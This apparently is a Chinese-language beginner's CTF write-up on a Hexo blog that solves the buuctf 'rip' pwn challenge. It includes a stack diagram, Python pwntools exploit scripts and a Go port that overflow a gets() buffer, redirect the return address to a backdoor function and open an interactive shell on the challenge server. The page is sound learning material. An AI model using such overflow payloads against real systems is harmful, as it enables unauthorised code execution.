@@ -1,0 +1,274 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Learn Pwn | Yliken</title><meta name="author" content="Yliken"><meta name="copyright" content="Yliken"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="声明: 我不会pwn， 也没有任何基础 这是我闲着没事随便找pwn题玩的 所以难免会有一些不准确的知识会误导您  buuctf - pwn - rip再次叠甲 写这题的时候啥也不会 看了一眼栈溢出原理 这这个题目与演示的demo一模一样 所以 比葫芦画瓢 该字符串距离 rbp 的长度为 0xf 那么相应的栈结构为 123456789101112             +------------">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Learn Pwn">
+<meta property="og:url" content="http://example.com/2025/08/05/pwn/learn%20Pwn/index.html">
+<meta property="og:site_name" content="Yliken">
+<meta property="og:description" content="声明: 我不会pwn， 也没有任何基础 这是我闲着没事随便找pwn题玩的 所以难免会有一些不准确的知识会误导您  buuctf - pwn - rip再次叠甲 写这题的时候啥也不会 看了一眼栈溢出原理 这这个题目与演示的demo一模一样 所以 比葫芦画瓢 该字符串距离 rbp 的长度为 0xf 那么相应的栈结构为 123456789101112             +------------">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/essayhead/20.png">
+<meta property="article:published_time" content="2025-08-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-08-05T15:17:01.044Z">
+<meta property="article:author" content="Yliken">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/essayhead/20.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Learn Pwn",
+  "url": "http://example.com/2025/08/05/pwn/learn%20Pwn/",
+  "image": "http://example.com/img/essayhead/20.png",
+  "datePublished": "2025-08-04T16:00:00.000Z",
+  "dateModified": "2025-08-05T15:17:01.044Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Yliken",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/essayhead/favicon.ico"><link rel="canonical" href="http://example.com/2025/08/05/pwn/learn%20Pwn/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const hour = new Date().getHours()
+          const isNight = hour <= 24 || hour >= 0
+          if (theme === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else theme === 'light' ? activateLightMode() : activateDarkMode()
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Learn Pwn',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/wenzhang.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/essayhead/second.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-file-alt"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-scroll"></i><span> 阅读札记</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/reading/Whispers-of-Midie/"><i class="fa-fw fas fa-feather-alt"></i><span> 蝶梦笔语</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/memories/gallery/"><i class="fa-fw fas fa-images"></i><span> 图集</span></a></li><li><a class="site-page child" href="/memories/thoughts/"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span></a></li><li><a class="site-page child" href="/memories/plantRedBean/"><i class="fa-fw fas fa-seedling"></i><span> 红豆物语</span></a></li><li><a class="site-page child" href="/memories/unposted-wishes/"><i class="fa-fw fas fa-scroll"></i><span> 未寄之愿</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/essayhead/20.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/essayhead/second.jpg" alt="Logo"><span class="site-name">Yliken</span></a><a class="nav-page-title" href="/"><span class="site-name">Learn Pwn</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-file-alt"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-scroll"></i><span> 阅读札记</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/reading/Whispers-of-Midie/"><i class="fa-fw fas fa-feather-alt"></i><span> 蝶梦笔语</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/memories/gallery/"><i class="fa-fw fas fa-images"></i><span> 图集</span></a></li><li><a class="site-page child" href="/memories/thoughts/"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span></a></li><li><a class="site-page child" href="/memories/plantRedBean/"><i class="fa-fw fas fa-seedling"></i><span> 红豆物语</span></a></li><li><a class="site-page child" href="/memories/unposted-wishes/"><i class="fa-fw fas fa-scroll"></i><span> 未寄之愿</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Learn Pwn</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-04T16:00:00.000Z" title="发表于 2025-08-05 00:00:00">2025-08-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-08-05T15:17:01.044Z" title="更新于 2025-08-05 23:17:01">2025-08-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BA%91%E5%8E%9F%E7%94%9F/">云原生</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">641</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>2分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote>
+<p>声明:</p>
+<p>我不会pwn， 也没有任何基础</p>
+<p>这是我闲着没事随便找pwn题玩的</p>
+<p>所以难免会有一些不准确的知识会误导您</p>
+</blockquote>
+<h2 id="buuctf-pwn-rip"><a href="#buuctf-pwn-rip" class="headerlink" title="buuctf - pwn - rip"></a>buuctf - pwn - rip</h2><p>再次叠甲 写这题的时候啥也不会</p>
+<p>看了一眼<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">栈溢出原理</a></p>
+<p>这这个题目与演示的demo一模一样</p>
+<p>所以</p>
+<p>比葫芦画瓢</p>
+<p>该字符串距离 rbp 的长度为 0xf<br><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508052256395.png" alt="image-20250805225635205"></p>
+<p>那么相应的栈结构为</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">             +-----------------+</span></span><br><span class="line"><span class="code">             |     retaddr     |  &lt;-- 返回地址（return address）</span></span><br><span class="line"><span class="code">             +-----------------+</span></span><br><span class="line"><span class="code">             |     saved rbp   |  &lt;-- 保存的基址寄存器（RBP）</span></span><br><span class="line"><span class="code">      rbp---&gt;+-----------------+</span></span><br><span class="line"><span class="code">             |                 |  &lt;-- 局部变量 / 临时空间（向低地址）</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">s,rbp-0xf --&gt;+-----------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>后门函数是<code>fun</code> 可以在ida 中看到<code>fun</code>的地址<code>0x401186</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508052300791.png" alt="image-20250805230025646"></p>
+<p>那么如果我们读取的字符串为<code>0xf * &#39;a&#39; + &#39;b&#39; * 8 + fun_addr</code></p>
+<p>由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved rbp 覆盖为 bbbbbbbb，将 retaddr 覆盖为 func_addr</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">             +-----------------+</span></span><br><span class="line"><span class="code">             |     0x401186    |</span></span><br><span class="line"><span class="code">             +-----------------+</span></span><br><span class="line"><span class="code">             |     bbbbbbbb    |</span></span><br><span class="line"><span class="code">      rbp---&gt;+-----------------+</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">s,ebp-0xf --&gt;+-----------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>ok 现在直接拿ctf WIKI上面的代码来打</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27268</span>)</span><br><span class="line">success_addr = <span class="number">0x401187</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xf</span> + <span class="string">b&#x27;v&#x27;</span> * <span class="number">8</span> + p64(success_addr)</span><br><span class="line"><span class="built_in">print</span>(p64(success_addr))</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508052311785.png" alt="image-20250805231109728"></p>
+<p>我将<code>success_addr</code> 设置为 0x401186的时候 打不通</p>
+<p>听朋友说要栈对齐 ，反正我现在是不懂这是啥玩意</p>
+<p>做法就是</p>
+<p>在<code>p64(success_addr)</code>前面随便加上一个return的地址</p>
+<p>那么修改后的代码就是这样子的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27268</span>)</span><br><span class="line">success_addr = <span class="number">0x401186</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xf</span> + <span class="string">b&#x27;v&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x401185</span>) +p64(success_addr)</span><br><span class="line"><span class="built_in">print</span>(p64(success_addr))</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>确实也能打通</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508052314092.png" alt="image-20250805231443952"></p>
+<p>另外</p>
+<p>题外事</p>
+<p>我闲着没事干将exp用go写了一下</p>
+<p>下面是源代码</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	r, err := net.Dial(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;node5.buuoj.cn:27268&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;Success connect to our Target&quot;</span>)</span><br><span class="line">	<span class="keyword">defer</span> r.Close()</span><br><span class="line">	funcAddr := <span class="type">uint64</span>(<span class="number">0x401187</span>)</span><br><span class="line"></span><br><span class="line">	payload := bytes.Repeat([]<span class="type">byte</span>(<span class="string">&quot;a&quot;</span>),<span class="number">0xf</span>)</span><br><span class="line">	payload = <span class="built_in">append</span>(payload,bytes.Repeat([]<span class="type">byte</span>(<span class="string">&quot;a&quot;</span>),<span class="number">8</span>)...)</span><br><span class="line">	addrBuf := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">	err = binary.Write(addrBuf, binary.LittleEndian, funcAddr)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">	payload = <span class="built_in">append</span>(payload,addrBuf.Bytes()...)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Our payload is ==&gt; &quot;</span>,payload)</span><br><span class="line">	r.Write(payload)</span><br><span class="line">	r.Write([]<span class="type">byte</span>(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;Try to input some Command&quot;</span>)</span><br><span class="line">	<span class="keyword">go</span> io.Copy(r, os.Stdin)</span><br><span class="line">	io.Copy(os.Stdout, r)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>确实也能打通</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508052316523.png" alt="image-20250805231656249"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Yliken</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/08/05/pwn/learn%20Pwn/">http://example.com/2025/08/05/pwn/learn%20Pwn/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Yliken</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/essayhead/20.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/essayhead/as.jpg" target="_blank"><img class="post-qr-code-img" src="/img/essayhead/as.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/essayhead/as.jpg" target="_blank"><img class="post-qr-code-img" src="/img/essayhead/as.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/08/03/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Motto/" title="mazesec-Motto"><img class="cover" src="/img/essayhead/60.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">mazesec-Motto</div></div><div class="info-2"><div class="info-item-1"> 我怕长此以往 都这样 滋长的绝望 在我身上 吧耐心渐渐耗光 我念念不忘 你离开的晚上 多悲伤 特别漫长  一、信息收集主机发现 123456789101112┌──(root㉿kali)-[/home/kali]└─# arp-scan -I eth1 192.168.56.0/24Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission deniedWARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission deniedStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.56.1    0a:00:27:00:00:04       (Unknown: locally...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="artalk-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/essayhead/second.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Yliken</div><div class="author-info-description">红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Yliken"><i class="fab fa-github"></i><span>Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Yliken" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:largetlafonu71@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">他说你任何为人称道的美丽  不及他第一次遇到你</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#buuctf-pwn-rip"><span class="toc-number">1.</span> <span class="toc-text">buuctf - pwn - rip</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/08/05/pwn/learn%20Pwn/" title="Learn Pwn"><img src="/img/essayhead/20.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Learn Pwn"/></a><div class="content"><a class="title" href="/2025/08/05/pwn/learn%20Pwn/" title="Learn Pwn">Learn Pwn</a><time datetime="2025-08-04T16:00:00.000Z" title="发表于 2025-08-05 00:00:00">2025-08-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/03/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Motto/" title="mazesec-Motto"><img src="/img/essayhead/60.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mazesec-Motto"/></a><div class="content"><a class="title" href="/2025/08/03/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Motto/" title="mazesec-Motto">mazesec-Motto</a><time datetime="2025-08-02T16:00:00.000Z" title="发表于 2025-08-03 00:00:00">2025-08-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Temp/" title="mazesec-Temp"><img src="/img/essayhead/11.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mazesec-Temp"/></a><div class="content"><a class="title" href="/2025/07/30/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Temp/" title="mazesec-Temp">mazesec-Temp</a><time datetime="2025-07-29T16:00:00.000Z" title="发表于 2025-07-30 00:00:00">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/28/CVE/cve-2024-39930/" title="CVE-2024-39930复现"><img src="/img/essayhead/82.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2024-39930复现"/></a><div class="content"><a class="title" href="/2025/07/28/CVE/cve-2024-39930/" title="CVE-2024-39930复现">CVE-2024-39930复现</a><time datetime="2025-07-27T16:00:00.000Z" title="发表于 2025-07-28 00:00:00">2025-07-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/16/%E4%BA%91/k8s%E6%90%AD%E5%BB%BA/" title="k8s搭建记"><img src="/img/essayhead/92.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="k8s搭建记"/></a><div class="content"><a class="title" href="/2025/07/16/%E4%BA%91/k8s%E6%90%AD%E5%BB%BA/" title="k8s搭建记">k8s搭建记</a><time datetime="2025-07-15T16:00:00.000Z" title="发表于 2025-07-16 00:00:00">2025-07-16</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By Yliken</div><div class="footer_custom_text">层楼终究误少年 自由早晚乱余生</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas 